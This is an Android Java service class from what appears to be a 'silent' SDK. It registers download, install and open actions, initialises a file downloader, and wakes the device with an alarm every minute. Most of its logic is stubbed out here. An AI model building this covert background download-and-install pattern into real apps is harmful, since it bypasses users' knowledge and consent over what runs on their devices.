package sdk.grayweb.com.slientsdk;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

import com.liulishuo.filedownloader.FileDownloader;
import com.liulishuo.filedownloader.util.FileDownloadHelper;

import java.net.Proxy;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import sdk.grayweb.com.slientsdk.action.DownloadAction;
import sdk.grayweb.com.slientsdk.action.IAction;
import sdk.grayweb.com.slientsdk.action.InitAction;
import sdk.grayweb.com.slientsdk.action.InstallAction;
import sdk.grayweb.com.slientsdk.action.OpenAction;
import sdk.grayweb.com.slientsdk.api.InitApi;
import sdk.grayweb.com.slientsdk.util.DivesUtil;

/**
 * Created by engine on 16/5/10.
 */
public class GrayService extends Service {
    private List<IAction>  actionList = new ArrayList<IAction>();
    private static final String REVICER = "com.slient.reciver";
    @Override
    public void onCreate() {
        super.onCreate();
        actionList.clear();
        actionList.add(new DownloadAction(this));
        actionList.add(new OpenAction(this));
        actionList.add(new InstallAction(this));
        //初奴化数据
        //初始化闹钟
        initDownload();
        new InitAction(this).doAction();
        registerReceiver(cupReciver, new IntentFilter(REVICER));
        alarm();
    }

    private void initDownload() {
        FileDownloader.init(this,
                new FileDownloadHelper.OkHttpClientCustomMaker() { // is not has to provide.
                    @Override
                    public OkHttpClient customMake() {
                        // just for OkHttpClient customize.
                        final OkHttpClient.Builder builder = new OkHttpClient.Builder();
                        // you can set the connection timeout.
                        builder.connectTimeout(15000, TimeUnit.MILLISECONDS);
                        // you can set the HTTP proxy.
                        builder.proxy(Proxy.NO_PROXY);
                        // etc.
                        return builder.build();
                    }
                });
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(cupReciver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * 闹钟回来后执行的操作
      */
    private void doAction(){
    }

    public void alarm() {
        Intent intent = new Intent();
        intent.setAction(REVICER);
        PendingIntent sender = PendingIntent.getBroadcast(
                this, 0, intent, 0);

        // We want the alarm to go off 10 seconds from now.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(Calendar.SECOND, 1);
        // Schedule the alarm!
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
//        am.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), sender);
        am.setRepeating(AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(), 60 * 1000, sender);
    }
    private IAction preAction(){
        Calendar calendar = Calendar.getInstance() ;
        int hour = calendar.get(Calendar.HOUR_OF_DAY) ;
        return null ;
    }
    private BroadcastReceiver cupReciver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            doAction();
        }
    };
}
